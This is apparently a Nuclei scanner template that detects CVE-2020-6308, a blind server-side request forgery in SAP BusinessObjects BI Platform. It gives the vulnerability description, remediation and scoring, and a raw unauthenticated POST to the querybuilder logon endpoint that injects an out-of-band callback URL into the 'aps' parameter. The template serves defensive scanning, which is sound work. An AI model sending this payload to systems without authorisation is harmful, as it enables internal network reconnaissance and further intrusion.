id: CVE-2020-6308

info:
  name: SAP BusinessObjects Business Intelligence Platform - Blind Server-Side Request Forgery
  author: madrobot
  severity: medium
  description: |
    SAP BusinessObjects Business Intelligence Platform (Web Services) 410, 420, and 430 is susceptible to blind server-side request forgery. An attacker can inject arbitrary values as CMS parameters to perform lookups on the internal network, which is otherwise not accessible externally. On successful exploitation, attacker can scan network to determine infrastructure and gather information for further attacks like remote file inclusion, retrieving server files, bypassing firewall, and forcing malicious requests.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to send arbitrary requests from the vulnerable server, potentially leading to unauthorized access to internal resources or further attacks.
  remediation: |
    Apply the relevant security patches provided by SAP to mitigate this vulnerability.
  reference:
    - https://github.com/InitRoot/CVE-2020-6308-PoC
    - https://launchpad.support.sap.com/#/notes/2943844
    - https://wiki.scn.sap.com/wiki/pages/viewpage.action?pageId=558632196
    - https://nvd.nist.gov/vuln/detail/CVE-2020-6308
    - https://github.com/ARPSyndicate/cvemon
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2020-6308
    cwe-id: CWE-918
    epss-score: 0.84438
    epss-percentile: 0.99277
    cpe: cpe:2.3:a:sap:businessobjects_business_intelligence_platform:4.1:-:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: sap
    product: businessobjects_business_intelligence_platform
  tags: cve2020,cve,sap,ssrf,oast,unauth

http:
  - raw:
      - |
        POST /AdminTools/querybuilder/logon?framework= HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        aps={{interactsh-url}}&usr=anything&pwd=anything&aut=secEnterprise&main_page=ie.jsp&new_pass_page=newpwdform.jsp&exit_page=logonform.jsp

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"

      - type: word
        part: location
        words:
          - "{{BaseURL}}/AdminTools/querybuilder/logonform.jsp"
# digest: 4a0a00473045022100e00a0166f234128c9e54ff0c1080ce8296f5565b99040fb35b8da3ce2c85bfef022065f32ce985cfd29ac83546e9973980d085381f0ffd15f385cbf1f96b218a2001:922c64590222798bb761d5b6d8e72950